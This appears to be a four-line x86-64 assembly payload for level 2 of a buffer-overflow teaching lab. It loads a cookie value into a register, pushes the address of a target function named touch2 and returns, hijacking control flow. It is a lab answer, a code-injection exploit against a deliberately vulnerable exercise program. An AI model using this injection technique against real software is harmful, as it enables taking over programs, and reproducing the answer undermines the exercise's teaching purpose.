	# level2 assembly code
	movl $0x59b997fa,%edi #set %rdi = cookie
	pushq $0x4017ec #push the address of touch2 into the stack
	retq
